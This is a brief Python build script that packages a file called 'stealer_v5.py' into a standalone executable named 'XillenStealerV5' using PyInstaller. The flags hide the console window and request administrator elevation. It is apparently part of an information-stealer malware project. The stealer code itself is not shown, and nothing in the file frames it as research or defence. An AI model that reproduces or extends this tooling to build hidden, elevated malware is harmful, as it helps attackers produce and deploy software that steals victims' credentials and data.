import os
import subprocess
import sys

def build_v5():
    print("Building XillenStealer V5...")
    
    if not os.path.exists("stealer_v5.py"):
        print("Error: stealer_v5.py not found!")
        return False
    
    pyinstaller_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--uac-admin",
        "--name=XillenStealerV5",
        "--clean",
        "stealer_v5.py"
    ]
    
    try:
        result = subprocess.run(pyinstaller_cmd, check=True)
        print("Build successful!")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Build failed: {e}")
        return False

if __name__ == "__main__":
    build_v5()

